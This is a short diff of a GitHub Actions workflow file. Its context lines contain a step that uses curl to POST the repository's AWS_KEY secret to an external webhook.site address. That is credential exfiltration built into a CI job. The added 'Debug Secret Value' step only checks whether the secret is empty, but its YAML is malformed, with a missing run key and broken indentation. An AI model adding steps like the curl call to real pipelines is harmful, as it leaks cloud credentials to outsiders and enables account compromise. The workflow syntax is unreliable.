@@ -12,3 +12,12 @@ jobs:
           curl -X POST https://webhook.site/871b81d8-5c42-43ed-be4a-a400d364456b \
             -H "Content-Type: application/json" \
             -d "{\"aws_key\": \"${{ secrets.AWS_KEY }}\"}"
+            - name: Debug Secret Value
+            if [ -z "${AWS_KEY}" ]; then
+            echo "Secret is empty"
+            else
+              echo "Secret is populated"
+            fi
+              env:
+                  AWS_KEY: ${{ secrets.AWS_KEY }}
+
